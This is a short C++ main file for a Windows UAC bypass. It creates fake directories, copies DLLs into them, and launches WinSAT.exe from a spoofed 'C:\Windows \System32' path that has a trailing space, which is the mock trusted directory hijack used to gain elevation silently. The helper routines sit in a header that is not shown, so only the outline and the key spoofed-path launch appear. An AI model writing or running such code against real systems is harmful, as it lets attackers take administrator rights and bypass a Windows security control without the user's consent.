#include "utils.hpp"

int main() {
    std::cout << "Starting uac bypass..\n";

    if (!InitalizePaths()) return 1;
    CreateFakeDirectories();
    if (!CopyDLLs() || !CopyMainFiles()) return 1;

    system("\"C:\\Windows \\System32\\WinSAT.exe\""); // We use system because ShellExecute normalizes the path and CreateProcess requires admin+

    return 0;
}